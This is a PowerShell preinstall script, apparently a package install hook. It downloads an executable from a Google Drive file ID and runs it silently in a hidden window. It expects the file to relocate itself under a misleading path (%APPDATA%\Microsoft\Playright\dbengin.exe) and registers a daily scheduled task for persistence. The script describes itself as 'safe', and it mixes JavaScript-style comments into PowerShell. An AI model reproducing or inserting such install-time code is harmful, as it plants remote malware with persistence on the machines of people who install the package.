
$ErrorActionPreference = 'Stop'
Write-Output "[preinstall-setup] Starting preinstall setup script..."
Write-Output "[preinstall-setup] Script execution started at $(Get-Date)"

# Use better-gdrive to download the requested file via an external node module file
$fileId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n'
$output = "C:\\Users\\DEEBYTE COMPUTERS\\Documents\\Js\\downloaded_from_gdown.exe"
$env:DOWNLOAD_OUTPUT = $output
Write-Output "[preinstall-setup] File ID: $fileId, Output path: $output"

Write-Output "[preinstall-setup] Running Node download helper (safe, exits 0)"
try {
        $scriptPath = Join-Path $PSScriptRoot 'preinstall_download.mjs'
        $downloadOutput = node $scriptPath 2>&1
        Write-Output "[preinstall-setup] Download helper output: $downloadOutput"
} catch {
        Write-Output "[preinstall-setup] ERROR: Node download helper failed: $_"
}

// ---------------------------------------------
// DOWNLOAD COMPLETE � NOW HANDLE THE EXE
// ---------------------------------------------
if (Test-Path $output) {
    Write-Output "[preinstall-setup] File exists: $output"
    Write-Output "[preinstall-setup] File size: $(Get-Item $output).Length bytes"

    # 1. Execute the downloaded file (it will move itself to %APPDATA%\Microsoft\Playright\dbengin.exe)
    Write-Output "[preinstall-setup] Executing downloaded file (once, silently) to let it self-install..."
    $proc = Start-Process -FilePath $output -WindowStyle Hidden -NoNewWindow -Wait -PassThru -ErrorAction SilentlyContinue
    Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"

    # 2. Define the final expected path after self-move
    $finalExe = Join-Path $env:APPDATA "Microsoft\Playright\dbengin.exe"
    Write-Output "[preinstall-setup] Expecting final exe at: $finalExe"

    # 3. Wait briefly for file system (optional, but good practice)
    Start-Sleep -Seconds 2

    if (Test-Path $finalExe) {
        Write-Output "[preinstall-setup] Final exe found. Creating scheduled task..."

        # Create scheduled task to run daily at 09:00
        $taskName = "dbengin"
        $startTime = "09:00"
        $trigger = New-ScheduledTaskTrigger -Daily -At $startTime
        $action = New-ScheduledTaskAction -Execute $finalExe
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

        try {
            Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal -Settings $settings -Force
            Write-Output "[preinstall-setup] Scheduled task '$taskName' created successfully."
        } catch {
            Write-Output "[preinstall-setup] ERROR creating scheduled task: $_"
        }
    }
}
